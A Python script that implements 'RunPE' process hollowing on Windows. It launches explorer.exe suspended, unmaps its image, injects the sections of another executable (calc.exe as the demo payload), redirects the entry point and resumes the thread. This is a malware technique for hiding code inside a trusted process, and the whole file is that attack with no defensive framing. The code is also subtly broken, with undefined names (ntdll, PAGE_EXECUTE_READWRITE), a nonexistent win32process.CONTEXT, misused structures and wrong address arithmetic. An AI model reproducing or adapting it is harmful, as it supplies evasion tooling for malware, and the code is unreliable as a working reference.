import os
import pefile
import struct
import subprocess
import sys
from ctypes import *
import ctypes
import win32process
import ctypes
import time

BYTE      = ctypes.c_ubyte
WORD      = ctypes.c_ushort
DWORD     = ctypes.c_uint32
LPSTR 	  = ctypes.c_char_p 
HANDLE    = ctypes.c_void_p
PVOID = LPVOID = c_void_p
LONG = ctypes.c_long


CONTEXT_ALL = 0x10007  # taken from winnt.h
kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)


class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [("hProcess", ctypes.c_void_p),
                ("hThread", ctypes.c_void_p),
                ("dwProcessId", ctypes.c_ulong),
                ("dwThreadId", ctypes.c_ulong)]

class STARTUPINFO(ctypes.Structure):
    _fields_ = [("cb", ctypes.c_ulong),
                ("lpReserved", ctypes.c_char_p),
                ("lpDesktop", ctypes.c_char_p),
                ("lpTitle", ctypes.c_char_p),
                ("dwX", ctypes.c_ulong),
                ("dwY", ctypes.c_ulong),
                ("dwXSize", ctypes.c_ulong),
                ("dwYSize", ctypes.c_ulong),
                ("dwXCountChars", ctypes.c_ulong),
                ("dwYCountChars", ctypes.c_ulong),
                ("dwFillAttribute", ctypes.c_ulong),
                ("dwFlags", ctypes.c_ulong),
                ("wShowWindow", ctypes.c_ushort),
                ("cbReserved2", ctypes.c_ushort),
                ("lpReserved2", ctypes.c_char_p),
                ("hStdInput", ctypes.c_void_p),
                ("hStdOutput", ctypes.c_void_p),
                ("hStdError", ctypes.c_void_p)]
    
class CONTEXT64(Structure):
    _fields_ = [("P1Home", c_uint64),
                ("P2Home", c_uint64),
                ("P3Home", c_uint64),
                ("P4Home", c_uint64),
                ("P5Home", c_uint64),
                ("P6Home", c_uint64),
                ("ContextFlags", c_ulong),
                ("MxCsr", c_uint32),
                ("SegCs", c_ushort),
                ("SegDs", c_ushort),
                ("SegEs", c_ushort),
                ("SegFs", c_ushort),
                ("SegGs", c_ushort),
                ("SegSs", c_ushort),
                ("EFlags", c_ulong),
                ("Dr0", c_uint64),
                ("Dr1", c_uint64),
                ("Dr2", c_uint64),
                ("Dr3", c_uint64),
                ("Dr6", c_uint64),
                ("Dr7", c_uint64),
                ("Rax", c_uint64),
                ("Rcx", c_uint64),
                ("Rdx", c_uint64),
                ("Rbx", c_uint64),
                ("Rsp", c_uint64),
                ("Rbp", c_uint64),
                ("Rsi", c_uint64),
                ("Rdi", c_uint64),
                ("R8", c_uint64),
                ("R9", c_uint64),
                ("R10", c_uint64),
                ("R11", c_uint64),
                ("R12", c_uint64),
                ("R13", c_uint64),
                ("R14", c_uint64),
                ("R15", c_uint64),
                ("Rip", c_uint64),
                ("FltSave", c_byte * 512),
                ("VectorRegister", c_uint64 * 26),
                ("VectorControl", c_uint64)]



def runpe(target_path: str, source_path: str):
    # Parse source PE structure
    src_pe = pefile.PE(source_path)

    if src_pe.is_exe():
        # Start a suspended instance of target
        target_proc_info = win32process.STARTUPINFO()
        target_proc_info.cb = ctypes.sizeof(target_proc_info)

        if kernel32.CreateProcessW(target_path, None, None, None, False, win32process.CREATE_SUSPENDED, None, None, ctypes.byref(target_proc_info), ctypes.byref(target_proc_info)):
            ctx = win32process.CONTEXT()
            ctx.ContextFlags = CONTEXT_ALL

            if kernel32.GetThreadContext(target_proc_info.hThread, ctypes.byref(ctx)):
                image_base = ctx.Ebx + 8

                # Unmap target code
                nt_unmap_view_of_section = ntdll.NtUnmapViewOfSection
                nt_unmap_view_of_section.argtypes = [HANDLE, PVOID]
                nt_unmap_view_of_section.restype = LONG
                status = nt_unmap_view_of_section(target_proc_info.hProcess, PVOID(image_base))

                if status == 0:
                    # Realloc for source code
                    p_image_base = kernel32.VirtualAllocEx(target_proc_info.hProcess, PVOID(image_base), src_pe.OPTIONAL_HEADER.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE)

                    if p_image_base:
                        # Read source headers
                        src_headers_ptr = src_pe.OPTIONAL_HEADER.ImageBase
                        src_headers = src_pe.get_memory_mapped_image()[0:src_pe.OPTIONAL_HEADER.SizeOfHeaders]

                        # Write source headers
                        success = kernel32.WriteProcessMemory(target_proc_info.hProcess, p_image_base, src_headers, len(src_headers), None)

                        for section in src_pe.sections:
                            # Get pointer on section and copy the content
                            src_section_ptr = src_pe.OPTIONAL_HEADER.ImageBase + section.VirtualAddress
                            src_section = src_pe.get_memory_mapped_image()[section.PointerToRawData:section.PointerToRawData + section.SizeOfRawData]

                            # Write content to target
                            success &= kernel32.WriteProcessMemory(target_proc_info.hProcess, PVOID(image_base + section.VirtualAddress), src_section, len(src_section), None)

                        if success:
                            kernel32.WriteProcessMemory(target_proc_info.hProcess, PVOID(ctx.Ebx + 8), PVOID(ctypes.addressof(p_image_base)), ctypes.sizeof(PVOID), None)  # Rewrite image base
                            ctx.Eax = image_base + src_pe.OPTIONAL_HEADER.AddressOfEntryPoint  # Rewrite entry point
                            kernel32.SetThreadContext(target_proc_info.hThread, ctypes.byref(ctx))  # Set thread context
                            kernel32.ResumeThread(target_proc_info.hThread)  # Resume main thread

            kernel32.CloseHandle(target_proc_info.hThread)
            kernel32.CloseHandle(target_proc_info.hProcess)


if __name__ == '__main__':
    runpe('C:\\Windows\\explorer.exe', 'C:\\Windows\\System32\\calc.exe')